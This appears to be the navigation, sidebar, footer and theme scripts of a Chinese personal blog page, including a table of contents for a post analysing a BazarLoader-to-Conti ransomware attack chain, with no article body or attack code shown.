class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%EF%BC%9A%E4%B8%80%E6%9D%A1%E5%8F%AA%E7%95%99%E4%BA%86-32-%E5%B0%8F%E6%97%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">案例：一条只留了 32 小时的完整攻击链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E4%B8%8E%E8%90%BD%E5%9C%B0%EF%BC%9ALoader-%E5%8F%AA%E8%B4%9F%E8%B4%A3%E5%BC%80%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">初始访问与落地：Loader 只负责开路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E4%B8%8E%E6%A8%AA%E5%90%91%EF%BC%9Awmic-%E6%98%AF%E4%B8%BB%E5%8A%9B"><span class="toc-number">3.</span> <span class="toc-text">凭据与横向：wmic 是主力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E6%B3%84%E4%B8%8E%E5%8B%92%E7%B4%A2%EF%BC%9A%E5%85%88%E6%8B%BF%E6%95%B0%E6%8D%AE%E5%86%8D%E5%8A%A8%E6%89%8B"><span class="toc-number">4.</span> <span class="toc-text">外泄与勒索：先拿数据再动手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E4%BE%A7%E6%B2%89%E6%B7%80%EF%BC%9A%E8%BF%99%E5%BC%A0%E7%BD%91%E6%80%8E%E4%B9%88%E7%BB%87"><span class="toc-number">5.</span> <span class="toc-text">检测侧沉淀：这张网怎么织</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E5%91%8A%E6%B2%A1%E6%9C%89%E5%9B%9E%E7%AD%94%E7%9A%84%E9%83%A8%E5%88%86"><span class="toc-number">6.</span> <span class="toc-text">报告没有回答的部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">7.</span> <span class="toc-text">速查表</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/3e3f274c/" title="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解"><img src="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解"/></a><div class="content"><a class="title" href="/posts/3e3f274c/" title="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解">从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解</a><time datetime="2026-10-28T04:10:00.000Z" title="发表于 2026-10-28 12:10:00">2026-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img src="https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79d0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS 漏洞详解——原理、类型、测试与绕过"/></a><div class="content"><a class="title" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过">XSS 漏洞详解——原理、类型、测试与绕过</a><time datetime="2026-10-27T04:30:00.000Z" title="发表于 2026-10-27 12:30:00">2026-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用"><img src="https://pic1.imgdb.cn/item/6908b7e53203f7be00cc7a25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Obsidian 上手指南——从建库到长期可用"/></a><div class="content"><a class="title" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用">Obsidian 上手指南——从建库到长期可用</a><time datetime="2026-10-26T09:20:00.000Z" title="发表于 2026-10-26 17:20:00">2026-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/19ab467e/" title="SQL注入详解"><img src="https://pic1.imgdb.cn/item/6909bf6b3203f7be00cf703e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入详解"/></a><div class="content"><a class="title" href="/posts/19ab467e/" title="SQL注入详解">SQL注入详解</a><time datetime="2026-09-13T10:24:09.000Z" title="发表于 2026-09-13 18:24:09">2026-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/98b6d68d/" title="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)"><img src="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)"/></a><div class="content"><a class="title" href="/posts/98b6d68d/" title="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)">搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)</a><time datetime="2026-01-21T11:07:36.000Z" title="发表于 2026-01-21 19:07:36">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" href="javascript:toRandomPost()">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><a href="https://blog.just-ok.xyz/archives/Hexo-Github-Vercel-DeploymentTutorial.html">建站指南</a><a href="https://blog.just-ok.xyz/link">网址导航</a></li><li><a href="https://blog.just-ok.xyz/">来杯咖啡</a><a href="https://blog.just-ok.xyz/comments">留点什么</a></li><li><a href="https://blog.just-ok.xyz/about">关于博主</a><a target="_blank" rel="noopener" href="https://fe32.top/archives/">文章归档</a></li><li><a href="https://blog.just-ok.xyz/categories">文章分类</a><a href="https://blog.just-ok.xyz/tags">文章标签</a></li><li><a href="https://blog.just-ok.xyz/Gallery/">我的相册</a><a href="https://blog.just-ok.xyz/">我的追番</a></li><li><a href="https://blog.just-ok.xyz/">一些特效</a><a href="https://blog.just-ok.xyz/">一些壁纸</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://blog.id-zyuan.xyz/"><img src="https://pic1.imgdb.cn/item/6829891e58cb8da5c8fabff0.png" alt="zhaoyuan" title="zhaoyuan"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://qinghuidaqzp.github.io/"><img src="https://pic1.imgdb.cn/item/6922f8033203f7be00255c87.jpg" alt="qinghuidaqzp" title="qinghuidaqzp"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.muooy.com/"><img src="https://www.muooy.com/favicon.png" alt="大理鱼儿" title="大理鱼儿"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.elykia.cn/" rel="external nofollow noreferrer noopener noopener"><img src="https://bu.dusays.com/2024/10/25/671b2438203a6.gif" alt="Elykia" title="Elykia"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.fiveth.cc/" rel="external nofollow noreferrer noopener noopener"><img src="https://p.fiveth.cc/avatar.png" alt="Fiveth" title="Fiveth"/></a></div></div></div></div><div class="copyright">&copy;2024 - 2026  <i id="heartbeat" class="fa fas fa-heartbeat"></i> just.ok</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script type="text/javascript" src="/js/daliyuer.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_categories_card_injector_config(){
+    // 检查容器是否存在
+    var parent_div_git = document.getElementById('recent-posts');
+    // 如果容器不存在，则动态创建
+    if (!parent_div_git) {
+      console.warn('butterfly_categories_card: 挂载容器不存在，正在动态创建...');
+      // 创建新容器（默认插入到页面主体顶部）
+      parent_div_git = document.createElement('div');
+      parent_div_git.id = 'recent-posts'; // 赋予配置的ID
+      document.querySelector('#page').prepend(parent_div_git); // 插入到 #content-inner 内
+    }
+    var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 950px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 800px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7955.jpg);"> <a class="categoryBar-list-link" href="/categories/项目作品/">项目作品</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">1</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7957.jpg);"> <a class="categoryBar-list-link" href="/categories/密码学/">密码学</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">2</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7958.jpg);"> <a class="categoryBar-list-link" href="/categories/知识库/">知识库</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">3</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc795a.jpg);"> <a class="categoryBar-list-link" href="/categories/建站与运维/">建站与运维</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">4</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7956.jpg);"> <a class="categoryBar-list-link" href="/categories/渗透测试/">渗透测试</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">5</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7959.jpg);"> <a class="categoryBar-list-link" href="/categories/数据安全与隐私/">数据安全与隐私</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">6</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79cf.jpg);"> <a class="categoryBar-list-link" href="/categories/随笔/">随笔</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">7</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79ce.jpg);"> <a class="categoryBar-list-link" href="/categories/开发环境/">开发环境</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">8</span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/数据结构与算法/">数据结构与算法</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/操作系统/">操作系统</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/工具与效率/">工具与效率</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/逆向工程/">逆向工程</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/机器学习/">机器学习</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/计算机网络/">计算机网络</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+    console.log('已挂载 butterfly_categories_card');
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+  }
+  // 路径匹配逻辑（使用 startsWith）
+  if (location.pathname.startsWith('/categories/') || '/categories/' === 'all') {
+    butterfly_categories_card_injector_config();
+  }
+  </script><!-- hexo injector body_end end --></body></html>
